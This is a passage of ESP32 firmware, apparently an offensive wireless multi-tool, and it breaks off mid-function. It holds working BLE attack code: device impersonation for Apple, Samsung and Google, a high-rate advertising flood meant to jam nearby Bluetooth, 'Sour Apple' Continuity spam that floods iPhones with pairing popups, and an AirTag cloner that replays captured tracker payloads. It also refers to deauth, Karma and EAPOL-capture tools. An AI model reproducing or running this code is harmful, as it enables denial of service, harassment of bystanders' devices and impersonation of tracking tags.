//  Soft-AP Web UI mode  (BOOT held 2 s)
//  SSID: ESP32-TYPHON   Password: rgisking
//  Full handlers live after BLE tools (see below).
// ============================================================
static uint32_t bootHoldStart = 0;
static bool     bootWasDown = false;
static bool     webExitRequested = false;

// Forward decls for tools defined later
static void sniffStop();
static void spoofStop();
static void sourStop();
static void jamStop();
static void airTagStop();

static void restoreWebAP() {
  if (!webMode) return;
  // Keep Soft-AP alive for the browser session
  WiFi.mode(WIFI_AP);
  WiFi.softAP("ESP32-TYPHON", "rgisking");
  radioSettleRequest(25);
}

static void stopAllTools() {
  pmStop();
  beaconStop();
  detStop();
  deauthStop();
  clientSniffStop();
  probeStop();
  captiveStop();
  sniffStop();
  spoofStop();
  sourStop();
  jamStop();
  airTagStop();
  karmaStop();
  floodStop();
  eapolStop();
  wifiScanning = false;
  if (webMode) restoreWebAP();
  else if (warMode) typhoonApplyWarRadio();
}

// Placeholder – real implementations after BLE section
static void drawWebModeScreen();
static void enterWebMode();
static void exitWebMode();
static void setupWebRoutes();
static void handleWebClients();

// ============================================================
//  BLE – Bluedroid only (scan / sniff / spoof / jam)
// ============================================================
#define BLE_MAX_DEVS 64

struct BleDev {
  String  name;
  String  addr;
  int32_t rssi;
  uint32_t hits;
  uint32_t lastSeen;
  bool    randomized;
  bool    suspicious;
  uint8_t macChanges;
  uint8_t mfg[31];
  uint8_t mfgLen;
  uint8_t adv[62];
  uint8_t advLen;
  bool    isApple;
  bool    isAirTagLike;
};

static BleDev   bleDevs[BLE_MAX_DEVS];
static int      bleCount = 0;
static bool     bleScanning = false;
static bool     bleReady = false;
static uint32_t bleSuspicious = 0;
static uint32_t bleFloodAlerts = 0;
static uint32_t bleNewThisScan = 0;
static volatile bool bleScanDone = false;
static uint32_t bleScanStartedAt = 0;

static bool bleIsRandomizedMac(const String& mac) {
  if (mac.length() < 2) return false;
  char* end = nullptr;
  long v = strtol(mac.substring(0, 2).c_str(), &end, 16);
  return (v & 0xC0) == 0xC0;
}

static void bleMacToStr(const uint8_t* bda, char* out, size_t n) {
  snprintf(out, n, "%02X:%02X:%02X:%02X:%02X:%02X",
           bda[0], bda[1], bda[2], bda[3], bda[4], bda[5]);
}

static int bleFindByAddr(const String& addr) {
  for (int i = 0; i < bleCount; i++)
    if (bleDevs[i].addr == addr) return i;
  return -1;
}

// ---- Bluedroid lifecycle ----
static void bleShutdownAll() {
  if (!bleReady) return;
  esp_ble_gap_stop_scanning();
  esp_ble_gap_stop_advertising();
  bleScanning = false;
  esp_bluedroid_disable();
  esp_bluedroid_deinit();
  esp_bt_controller_disable();
  esp_bt_controller_deinit();
  bleReady = false;
  radioSettleRequest(20);
}

static void bleGapCb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param);

static void bleInit() {
  if (bleReady) return;

  static bool classicReleased = false;
  if (!classicReleased) {
    esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
    classicReleased = true;
  }

  esp_bt_controller_config_t cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_err_t e = esp_bt_controller_init(&cfg);
  if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) return;
  e = esp_bt_controller_enable(ESP_BT_MODE_BLE);
  if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) return;
  e = esp_bluedroid_init();
  if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) return;
  e = esp_bluedroid_enable();
  if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) return;

  esp_ble_gap_register_callback(bleGapCb);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);

  bleReady = true;
}

static bool bleInitBluedroid() {
  bleInit();
  return bleReady;
}


static void bleSortByRssi() {
  for (int i = 0; i < bleCount - 1; i++) {
    for (int j = i + 1; j < bleCount; j++) {
      if (bleDevs[j].rssi > bleDevs[i].rssi) {
        BleDev t = bleDevs[i];
        bleDevs[i] = bleDevs[j];
        bleDevs[j] = t;
      }
    }
  }
}

static void bleProcessAdv(uint8_t *bda, int rssi, uint8_t *payload, uint8_t plen) {
  char addrStr[18];
  bleMacToStr(bda, addrStr, sizeof(addrStr));
  String addr = addrStr;
  int idx = bleFindByAddr(addr);
  uint32_t now = millis();
  if (idx < 0) {
    if (bleCount >= BLE_MAX_DEVS) return;
    idx = bleCount++;
    bleDevs[idx].addr = addr;
    bleDevs[idx].name = addr;
    bleDevs[idx].hits = 0;
    bleDevs[idx].macChanges = 0;
    bleDevs[idx].suspicious = false;
    bleDevs[idx].randomized = bleIsRandomizedMac(addr);
    bleDevs[idx].mfgLen = 0;
    bleDevs[idx].advLen = 0;
    bleDevs[idx].isApple = false;
    bleDevs[idx].isAirTagLike = false;
    bleNewThisScan++;
  }
  bleDevs[idx].rssi = rssi;
  bleDevs[idx].hits++;
  bleDevs[idx].lastSeen = now;
  if (plen > 0 && plen < 62) {
    memcpy(bleDevs[idx].adv, payload, plen);
    bleDevs[idx].advLen = plen;
  }

  // Parse AD structures for name + mfg
  uint8_t i = 0;
  while (i + 1 < plen) {
    uint8_t len = payload[i];
    if (len == 0 || i + len >= plen) break;
    uint8_t typ = payload[i + 1];
    if ((typ == 0x09 || typ == 0x08) && len >= 2) {
      char nm[29];
      uint8_t nlen = len - 1;
      if (nlen > 28) nlen = 28;
      memcpy(nm, payload + i + 2, nlen);
      nm[nlen] = 0;
      bleDevs[idx].name = nm;
    } else if (typ == 0xFF && len >= 2) {
      uint8_t mlen = len - 1;
      if (mlen > 30) mlen = 30;
      memcpy(bleDevs[idx].mfg, payload + i + 2, mlen);
      bleDevs[idx].mfgLen = mlen;
      if (mlen > 28) bleDevs[idx].suspicious = true;
    }
    i = (uint8_t)(i + len + 1);
  }
  if (bleDevs[idx].hits > 80) bleDevs[idx].suspicious = true;
  if (bleDevs[idx].randomized) {
    bleDevs[idx].macChanges++;
    if (bleDevs[idx].macChanges > 6) bleDevs[idx].suspicious = true;
  }

  // Apple company ID 4C:00 in mfg or ADV
  if (bleDevs[idx].mfgLen >= 2 && bleDevs[idx].mfg[0] == 0x4C && bleDevs[idx].mfg[1] == 0x00)
    bleDevs[idx].isApple = true;
  for (int k = 0; k + 3 < (int)plen; k++) {
    if (payload[k] == 0x4C && payload[k+1] == 0x00) bleDevs[idx].isApple = true;
    if (payload[k] == 0x12 && payload[k+1] == 0x19) bleDevs[idx].isAirTagLike = true;
    if (payload[k] == 0x1E && payload[k+1] == 0xFF && k + 3 < plen &&
        payload[k+2] == 0x4C && payload[k+3] == 0x00) bleDevs[idx].isAirTagLike = true;
  }

}

static void bleGapCb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
  switch (event) {
    case ESP_GAP_BLE_SCAN_RESULT_EVT:
      if (param->scan_rst.search_evt == ESP_GAP_SEARCH_INQ_RES_EVT) {
        bleProcessAdv(param->scan_rst.bda, param->scan_rst.rssi,
                       param->scan_rst.ble_adv, param->scan_rst.adv_data_len);
      } else if (param->scan_rst.search_evt == ESP_GAP_SEARCH_INQ_CMPL_EVT) {
        bleScanDone = true;
        bleScanning = false;
      }
      break;
    case ESP_GAP_BLE_SCAN_STOP_COMPLETE_EVT:
      bleScanning = false;
      bleScanDone = true;
      break;
    default:
      break;
  }
}

static esp_ble_scan_params_t bleScanParams = {
  .scan_type = BLE_SCAN_TYPE_ACTIVE,
  .own_addr_type = BLE_ADDR_TYPE_RANDOM,
  .scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL,
  .scan_interval = 0x50,
  .scan_window = 0x30,
  .scan_duplicate = BLE_SCAN_DUPLICATE_DISABLE
};

static void airSpoofStop();
static void bleScanStart() {
  if (bleScanning) return;
  if (sourRunning) sourStop();
  if (jamRunning) jamStop();
  if (spoofRunning) spoofStop();
  if (airSpoofRunning) airSpoofStop();
  radioAcquire(RADIO_BLE_SCAN);
  bleInit();
  if (!bleReady) {
    radioRelease(RADIO_BLE_SCAN);
    return;
  }
  esp_ble_gap_stop_advertising();
  bleCount = 0;
  bleNewThisScan = 0;
  bleScanDone = false;
  bleScanning = true;
  bleScanStartedAt = millis();
  esp_ble_gap_set_scan_params(&bleScanParams);
  esp_ble_gap_start_scanning(12);  // seconds
}

static void bleScanUpdate() {
  if (!bleScanning && !bleScanDone) return;
  if (bleScanning && (millis() - bleScanStartedAt > 12000)) {
    esp_ble_gap_stop_scanning();
    bleScanning = false;
    bleScanDone = true;
  }
  if (!bleScanDone) return;
  bleScanDone = false;
  radioRelease(RADIO_BLE_SCAN);
  bleSortByRssi();

  bleSuspicious = 0;
  for (int i = 0; i < bleCount; i++)
    if (bleDevs[i].suspicious) bleSuspicious++;
  if (bleNewThisScan > 18) bleFloodAlerts++;

  for (int i = 0; i < bleCount - 1; i++)
    for (int j = i + 1; j < bleCount; j++)
      if (bleDevs[j].rssi > bleDevs[i].rssi) {
        BleDev t = bleDevs[i]; bleDevs[i] = bleDevs[j]; bleDevs[j] = t;
      }
}

// ============================================================
//  BLE Sniffer (continuous GAP scan)
// ============================================================
static bool sniffRunning = false;
static uint32_t sniffLast = 0;

static void sniffStart() {
  sniffRunning = true;
  sniffLast = 0;
  bleScanStart();
}

static void sniffStop() {
  sniffRunning = false;
  if (bleScanning) {
    esp_ble_gap_stop_scanning();
    bleScanning = false;
  }
}

static void sniffUpdate() {
  if (!sniffRunning) return;
  if (!bleScanning && (millis() - sniffLast > 1200)) {
    sniffLast = millis();
    uint32_t now = millis();
    for (int i = 0; i < bleCount; ) {
      if (now - bleDevs[i].lastSeen > 45000UL) {
        for (int j = i; j < bleCount - 1; j++) bleDevs[j] = bleDevs[j + 1];
        bleCount--;
      } else i++;
    }
    bleScanStart();
  }
}

// ============================================================
//  BLE Spoofer – Bluedroid raw / name ADV
// ============================================================

static uint8_t spoofIdx = 0;
static int spoofNameIdx = 0;
static uint32_t spoofLast = 0;
static uint8_t spoofMode = 0;
static int spoofDevIdx = -1;  // handheld: selected BLE dev for clone/adv
static uint8_t spoofPower = 9;
static uint16_t spoofInterval = 32;
static String  spoofCustomName = "ESP32-TYPHON";
static const char* spoofNames[] = {
  "AirPods Pro", "Galaxy Buds", "Pixel Buds", "Sony WH-1000",
  "JBL Flip", "Bose QC", "Beats Fit", "Unknown Device"
};
static const int SPOOF_COUNT = 8;

static const uint8_t SAMSUNG_ADV_TEMPLATE[15] = {
  14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
};
static const uint8_t samsungModels[] = {0x01, 0x02, 0x03};
static const uint8_t GOOGLE_ADV_TEMPLATE[14] = {
  0x03, 0x03, 0x2C, 0xFE,
  0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27,
  0x02, 0x0A, 0x00
};

static esp_ble_adv_params_t bleAdvParams = {
  .adv_int_min = 0x20,
  .adv_int_max = 0x40,
  .adv_type = ADV_TYPE_NONCONN_IND,
  .own_addr_type = BLE_ADDR_TYPE_RANDOM,
  .channel_map = ADV_CHNL_ALL,
  .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

static void spoofStart() {
  bleInit();
  if (bleScanning) { esp_ble_gap_stop_scanning(); bleScanning = false; }
  spoofRunning = true;
  spoofIdx = 0;
  spoofNameIdx = 0;
  spoofLast = 0;
}

static void spoofStop() {
  if (!spoofRunning) return;
  spoofRunning = false;
  esp_ble_gap_stop_advertising();
}

static void spoofUpdate() {
  if (!spoofRunning) return;
  if (millis() - spoofLast < 250) return;
  spoofLast = millis();
  bleInit();

  uint8_t packet[31];
  uint8_t plen = 0;
  static int rot = 0;

  static const uint8_t appleDevs[][31] = {
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  };

  if (spoofMode == 0) {
    memcpy(packet, appleDevs[rot % 4], 31);
    packet[17] = (uint8_t)esp_random();
    packet[18] = (uint8_t)esp_random();
    packet[19] = (uint8_t)esp_random();
    plen = 31;
    rot++;
  } else if (spoofMode == 1) {
    memcpy(packet, SAMSUNG_ADV_TEMPLATE, 15);
    packet[14] = samsungModels[rot % 3];
    plen = 15;
    rot++;
  } else if (spoofMode == 2) {
    memcpy(packet, GOOGLE_ADV_TEMPLATE, 14);
    packet[13] = (uint8_t)(esp_random() % 100);
    plen = 14;
    rot++;
  } else {
    // Name modes 3/4/5 — build flags + complete local name AD
    const char* nm = spoofNames[spoofIdx % SPOOF_COUNT];
    if (spoofMode == 5 && spoofCustomName.length() > 0) nm = spoofCustomName.c_str();
    else if (spoofMode == 4 && bleCount > 0) {
      if (spoofDevIdx >= 0 && spoofDevIdx < bleCount)
        nm = bleDevs[spoofDevIdx].name.c_str();
      else {
        nm = bleDevs[spoofNameIdx % bleCount].name.c_str();
        spoofNameIdx = (spoofNameIdx + 1) % bleCount;
      }
    } else {
      spoofIdx = (spoofIdx + 1) % SPOOF_COUNT;
    }
    size_t nl = strnlen(nm, 26);
    packet[0] = 0x02; packet[1] = 0x01; packet[2] = 0x06;
    packet[3] = (uint8_t)(nl + 1); packet[4] = 0x09;
    memcpy(packet + 5, nm, nl);
    plen = (uint8_t)(5 + nl);
  }

  static uint32_t spoofPkt = 0;
  spoofPkt++;
  if ((spoofPkt % 10) == 1) {
    esp_bd_addr_t mac;
    mac[0] = (uint8_t)((esp_random() & 0xFF) | 0xC0);
    for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
    esp_ble_gap_set_rand_addr(mac);
  }

  uint16_t iv = spoofInterval;
  if (iv < 16) iv = 16;
  if (iv > 160) iv = 160;
  bleAdvParams.adv_int_min = iv;
  bleAdvParams.adv_int_max = (uint16_t)(iv + 16);

  esp_ble_gap_config_adv_data_raw(packet, plen);
  esp_ble_gap_start_advertising(&bleAdvParams);
}

// fix: remove bogus spoofSentOrRotate - I'll fix after

// ============================================================
//  BLE ADV Flood – raw ADV noise flood (ESP32 radio only)
// ============================================================

static uint32_t jamLast = 0;
static uint32_t jamCount = 0;

static void jamStart() {
  sniffStop(); spoofStop(); sourStop(); airSpoofStop();
  if (bleScanning) { esp_ble_gap_stop_scanning(); bleScanning = false; }
  radioAcquire(RADIO_BLE_ADV);
  bleInit();
  if (!bleReady) return;
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  jamRunning = true;
  jamLast = 0;
  jamCount = 0;
}

static void jamStop() {
  if (!jamRunning) return;
  jamRunning = false;
  esp_ble_gap_stop_advertising();
  radioRelease(RADIO_BLE_ADV);
}

static void jamUpdate() {
  if (!jamRunning) return;
  // Max BLE ADV pollution: minimum spacing, all 3 ADV channels via stack
  if (millis() - jamLast < 4) return;
  jamLast = millis();
  jamCount++;
  if (!bleReady) { bleInit(); if (!bleReady) return; }

  uint8_t raw[31];
  int plen = 31;
  uint8_t kind = (uint8_t)(jamCount % 8);
  // Dense rotating templates (Apple / Samsung / Google / random mfg)
  if (kind == 0) {
    raw[0]=0x1E; raw[1]=0xFF; raw[2]=0x4C; raw[3]=0x00; raw[4]=0x07; raw[5]=0x19;
    for (int i=6;i<31;i++) raw[i]=(uint8_t)esp_random();
    plen=31;
  } else if (kind == 1) {
    raw[0]=0x1E; raw[1]=0xFF; raw[2]=0x4C; raw[3]=0x00; raw[4]=0x0F; raw[5]=0x05; raw[6]=0xC0;
    for (int i=7;i<31;i++) raw[i]=(uint8_t)esp_random();
    plen=31;
  } else if (kind == 2) {
    raw[0]=0x0F; raw[1]=0xFF; raw[2]=0x75; raw[3]=0x00;
    for (int i=4;i<16;i++) raw[i]=(uint8_t)esp_random();
    plen=16;
  } else if (kind == 3) {
    memcpy(raw, GOOGLE_ADV_TEMPLATE, 14);
    for (int i=8;i<14;i++) raw[i]=(uint8_t)esp_random();
    plen=14;
  } else if (kind == 4) {
    raw[0]=0x1E; raw[1]=0xFF; raw[2]=0x06; raw[3]=0x00;
    for (int i=4;i<31;i++) raw[i]=(uint8_t)esp_random();
    plen=31;
  } else if (kind == 5) {
    // Flags + complete local name spam
    const char* nm = "XXXXXX";
    raw[0]=0x02; raw[1]=0x01; raw[2]=0x06;
    raw[3]=0x07; raw[4]=0x09;
    for (int i=0;i<6;i++) raw[5+i]=(uint8_t)('A'+(esp_random()%26));
    plen=11;
  } else if (kind == 6) {
    raw[0]=0x02; raw[1]=0x01; raw[2]=0x1A;
    raw[3]=0x1B; raw[4]=0xFF;
    for (int i=5;i<31;i++) raw[i]=(uint8_t)esp_random();
    plen=31;
  } else {
    for (int i=0;i<31;i++) raw[i]=(uint8_t)esp_random();
    raw[0]=0x1E; raw[1]=0xFF;
    plen=31;
  }

  esp_bd_addr_t mac;
  mac[0] = (uint8_t)((esp_random() & 0x3F) | 0xC0);
  for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
  esp_ble_gap_set_rand_addr(mac);

  bleAdvParams.adv_int_min = 0x10;
  bleAdvParams.adv_int_max = 0x10;
  bleAdvParams.channel_map = ADV_CHNL_ALL;
  esp_ble_gap_config_adv_data_raw(raw, plen);
  esp_ble_gap_start_advertising(&bleAdvParams);
}

// ============================================================
//  Sour Apple – selectable Continuity models/actions (nyanBOX style)
// ============================================================
struct AppleType {
  uint8_t     code;      // action code OR high byte of model
  uint8_t     code2;     // low byte for model packets (0 = action-style)
  const char* name;
  bool        isModel;   // true = device model packet, false = action popup
};

// Models (proximity pairing style) + Actions (nearby popup style)
static const AppleType appleList[] = {
  // Models
  { 0x0E, 0x20, "AirPods Pro", true },
  { 0x0A, 0x20, "AirPods Max", true },
  { 0x02, 0x20, "AirPods", true },
  { 0x0F, 0x20, "AirPods 2nd Gen", true },
  { 0x13, 0x20, "AirPods 3rd Gen", true },
  { 0x14, 0x20, "AirPods Pro 2", true },
  { 0x00, 0x55, "AirTag", true },
  { 0x10, 0x20, "Beats Flex", true },
  { 0x06, 0x20, "Beats Solo 3", true },
  { 0x0B, 0x20, "Powerbeats Pro", true },
  { 0x11, 0x20, "Beats Studio Buds", true },
  { 0x12, 0x20, "Beats Fit Pro", true },
  { 0x17, 0x20, "Beats Studio Pro", true },
  // Actions (iOS popups)
  { 0x13, 0x00, "AppleTV AutoFill", false },
  { 0x24, 0x00, "Apple Vision Pro", false },
  { 0x05, 0x00, "Apple Watch", false },
  { 0x09, 0x00, "Setup New iPhone", false },
  { 0x0B, 0x00, "HomePod Setup", false },
  { 0x01, 0x00, "Setup New AppleTV", false },
  { 0x06, 0x00, "Pair AppleTV", false },
  { 0x27, 0x00, "AppleTV Connecting", false },
  { 0x20, 0x00, "Join This AppleTV?", false },
  { 0x2F, 0x00, "Sign in other device", false },
};
static const int APPLE_LIST_COUNT = sizeof(appleList) / sizeof(appleList[0]);


static int     sourSelected = 0;
static uint32_t sourLast = 0;
static uint32_t sourSent = 0;

static esp_ble_adv_params_t sourAdvParams = {
  .adv_int_min = 0x15,
  .adv_int_max = 0x25,
  .adv_type = ADV_TYPE_NONCONN_IND,
  .own_addr_type = BLE_ADDR_TYPE_RANDOM,
  .channel_map = ADV_CHNL_ALL,
  .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

static void sourBuildPacket(uint8_t* packet, uint8_t* plen, const AppleType& t) {
  if (t.isModel) {
    // nyanBOX Continuity model packet
    packet[0]  = 0x1E; packet[1] = 0xFF; packet[2] = 0x4C; packet[3] = 0x00;
    packet[4]  = 0x07; packet[5] = 0x19; packet[6] = 0x07;
    packet[7]  = t.code; packet[8] = t.code2;
    packet[9]  = 0x20; packet[10] = 0x75; packet[11] = 0xAA;
    packet[12] = 0x30; packet[13] = 0x01; packet[14] = 0x00; packet[15] = 0x00;
    packet[16] = 0x45;
    packet[17] = (uint8_t)esp_random();
    packet[18] = (uint8_t)esp_random();
    packet[19] = (uint8_t)esp_random();
    for (int i = 20; i < 31; i++) packet[i] = 0x00;
    *plen = 31;
  } else {
    packet[0] = 0x0A; packet[1] = 0xFF; packet[2] = 0x4C; packet[3] = 0x00;
    packet[4] = 0x0F; packet[5] = 0x05; packet[6] = 0xC0;
    packet[7] = t.code;
    packet[8] = (uint8_t)esp_random();
    packet[9] = (uint8_t)esp_random();
    packet[10] = (uint8_t)esp_random();
    *plen = 11;
  }
}

static void sourStart() {
  sourRunning = false;
  sourLast = 0;
  sourSent = 0;
}

static void sourStop() {
  if (!sourRunning) return;
  sourRunning = false;
  esp_ble_gap_stop_advertising();
  radioRelease(RADIO_BLE_ADV);
}

static uint16_t sourIntervalMs = 12;  // Continuity spam cadence (ms)

static void sourBeginAdvertise() {
  sniffStop();
  spoofStop();
  jamStop();
  airTagStop();
  if (bleScanning) { esp_ble_gap_stop_scanning(); bleScanning = false; }
  radioAcquire(RADIO_BLE_ADV);
  bleInit();
  if (!bleReady) { sourRunning = false; radioRelease(RADIO_BLE_ADV); return; }
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
  esp_ble_gap_stop_advertising();
  sourRunning = true;
  sourLast = 0;
  sourSent = 0;
}

static void sourUpdate() {
  if (!sourRunning) return;
  if (millis() - sourLast < sourIntervalMs) return;
  sourLast = millis();
  sourSent++;
  if (!bleReady) { bleInit(); if (!bleReady) return; }

  int idx = sourSelected;
  if (idx < 0 || idx >= APPLE_LIST_COUNT)
    idx = (int)(esp_random() % APPLE_LIST_COUNT);
  const AppleType& t = appleList[idx];

  // New random static MAC every packet (top bits 11)
  {
    esp_bd_addr_t mac;
    mac[0] = (uint8_t)((esp_random() & 0x3F) | 0xC0);
    for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
    esp_ble_gap_set_rand_addr(mac);
  }

  uint8_t packet[31];
  uint8_t plen = 0;
  sourBuildPacket(packet, &plen, t);
  if (plen < 4) return;

  esp_ble_gap_config_adv_data_raw(packet, plen);
  esp_ble_gap_start_advertising(&sourAdvParams);
}


// ============================================================
//  AirTag Detector + Spoofer (Bluedroid / nyanBOX-style)
// ============================================================
#define AIRTAG_MAX 48

struct AirTagDev {
  char     addr[18];
  char     name[24];
  int8_t   rssi;
  uint32_t lastSeen;
  uint8_t  payload[62];
  uint8_t  payloadLen;
};

static AirTagDev airTags[AIRTAG_MAX];
static int       airTagCount = 0;

static uint32_t  airDetLast = 0;
static bool      airDetScanning = false;

static int       airSpoofTarget = -1;
static int       airSpoofIdx = 0;
static uint32_t  airSpoofLast = 0;
static uint32_t  airTagSent = 0;
static bool      airTagRunning = false;
static int       airTagMode = 0;
static int       airMenuSel = 0;
static int       uiSelAir() { return airMenuSel; }

static bool isAirTagPayload(const uint8_t* payload, uint8_t len) {
  if (!payload || len < 4) return false;
  for (int i = 0; i <= (int)len - 4; i++) {
    if (payload[i] == 0x1E && payload[i+1] == 0xFF &&
        payload[i+2] == 0x4C && payload[i+3] == 0x00)
      return true;
    if (payload[i] == 0x4C && payload[i+1] == 0x00 &&
        payload[i+2] == 0x12 && payload[i+3] == 0x19)
      return true;
  }
  return false;
}

static int airTagFindAddr(const char* addr) {
  for (int i = 0; i < airTagCount; i++)
    if (strcmp(airTags[i].addr, addr) == 0) return i;
  return -1;
}

static void airTagSortByRssi() {
  for (int i = 0; i < airTagCount - 1; i++)
    for (int j = i + 1; j < airTagCount; j++)
      if (airTags[j].rssi > airTags[i].rssi) {
        AirTagDev tmp = airTags[i]; airTags[i] = airTags[j]; airTags[j] = tmp;
      }
}

// Pull AirTag-like devices from current bleDevs[] (filled by GAP scan)
static void airDetHarvestFromBleList() {
  uint32_t now = millis();
  for (int i = 0; i < bleCount; i++) {
    bool match = bleDevs[i].isAirTagLike;
    uint8_t buf[62];
    uint8_t blen = 0;
    // Prefer full ADV blob for clone fidelity
    if (bleDevs[i].advLen >= 4) {
      blen = bleDevs[i].advLen;
      memcpy(buf, bleDevs[i].adv, blen);
      if (isAirTagPayload(buf, blen)) match = true;
    }
    if (!match && bleDevs[i].mfgLen >= 4) {
      buf[0] = (uint8_t)(bleDevs[i].mfgLen + 1);
      buf[1] = 0xFF;
      memcpy(buf + 2, bleDevs[i].mfg, bleDevs[i].mfgLen);
      blen = (uint8_t)(bleDevs[i].mfgLen + 2);
      if (isAirTagPayload(buf, blen) || isAirTagPayload(bleDevs[i].mfg, bleDevs[i].mfgLen))
        match = true;
    }
    if (!match) continue;

    int idx = airTagFindAddr(bleDevs[i].addr.c_str());
    if (idx < 0) {
      if (airTagCount >= AIRTAG_MAX) continue;
      idx = airTagCount++;
      strncpy(airTags[idx].addr, bleDevs[i].addr.c_str(), 17);
      airTags[idx].addr[17] = 0;
      strcpy(airTags[idx].name, "AirTag");
    }
    airTags[idx].rssi = (int8_t)bleDevs[i].rssi;
    airTags[idx].lastSeen = now;
    if (blen > 0 && blen < 62) {
      memcpy(airTags[idx].payload, buf, blen);
      airTags[idx].payloadLen = blen;
    } else if (bleDevs[i].mfgLen > 0) {
      memcpy(airTags[idx].payload, bleDevs[i].mfg, bleDevs[i].mfgLen);
      airTags[idx].payloadLen = bleDevs[i].mfgLen;
    }
    if (bleDevs[i].name.length() > 0) {
      strncpy(airTags[idx].name, bleDevs[i].name.c_str(), 23);
      airTags[idx].name[23] = 0;
    }
  }
  airTagSortByRssi();
}

static void airDetStart() {
  airDetRunning = true;
  airTagRunning = true;
  airTagMode = 1;
  airDetLast = 0;
  airDetScanning = false;
  airTagCount = 0;
  sniffStop(); spoofStop(); sourStop(); jamStop();
  airSpoofRunning = false;
  esp_ble_gap_stop_advertising();
  bleInit();
  bleScanStart();
  airDetScanning = true;
  airDetLast = millis();
}

static void airDetStop() {
  airDetRunning = false;
  airDetScanning = false;
  if (airTagMode == 1) {
    airTagRunning = false;
    airTagMode = 0;
  }
  if (bleScanning) {
    esp_ble_gap_stop_scanning();
    bleScanning = false;
  }
}

static void airDetUpdate() {
  if (!airDetRunning) return;
  bleScanUpdate();
  if (airDetScanning) {
    if (bleScanning) return;
    airDetScanning = false;
    airDetHarvestFromBleList();
    airDetLast = millis();
    return;
  }
  // Faster rescan while hunting AirTags
  if (millis() - airDetLast > 1500) {
    bleScanStart();
    airDetScanning = true;
    airDetLast = millis();
  }
}

static bool parseMacStr(const char* s, uint8_t out[6]) {
  if (!s) return false;
  unsigned int b[6];
  if (sscanf(s, "%02x:%02x:%02x:%02x:%02x:%02x",
             &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6 &&
      sscanf(s, "%02X:%02X:%02X:%02X:%02X:%02X",
             &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
    return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
  return true;
}

static esp_ble_adv_params_t airAdvParams = {
  .adv_int_min = 0x15,
  .adv_int_max = 0x25,
  .adv_type = ADV_TYPE_NONCONN_IND,
  .own_addr_type = BLE_ADDR_TYPE_RANDOM,
  .channel_map = ADV_CHNL_ALL,
  .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

static void airSpoofStop() {
  if (!airSpoofRunning) return;
  airSpoofRunning = false;
  airTagRunning = false;
  airTagMode = 0;
  esp_ble_gap_stop_advertising();
  radioRelease(RADIO_BLE_ADV);
}

static void airSpoofStart(int targetIdx) {
  if (airTagCount <= 0) return;
  if (targetIdx >= airTagCount) targetIdx = 0;
  airDetStop();
  sniffStop(); spoofStop(); sourStop(); jamStop();
  radioAcquire(RADIO_BLE_ADV);
  bleInit();
  if (!bleReady) { radioRelease(RADIO_BLE_ADV); return; }
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  airSpoofTarget = targetIdx;  // -1 = clone all rotator
  airSpoofIdx = (targetIdx >= 0) ? targetIdx : 0;
  airSpoofRunning = true;
  airTagRunning = true;
  airTagMode = 2;
  airSpoofLast = 0;
  airTagSent = 0;
}

static void airSpoofUpdate() {
  if (!airSpoofRunning) return;
  if (airTagCount <= 0) { airSpoofStop(); return; }
  if (millis() - airSpoofLast < 15) return;
  airSpoofLast = millis();
  airTagSent++;
  bleInit();
  if (!bleReady) return;

  int idx;
  if (airSpoofTarget >= 0 && airSpoofTarget < airTagCount) idx = airSpoofTarget;
  else {
    idx = airSpoofIdx % airTagCount;
    airSpoofIdx = (airSpoofIdx + 1) % airTagCount;
  }

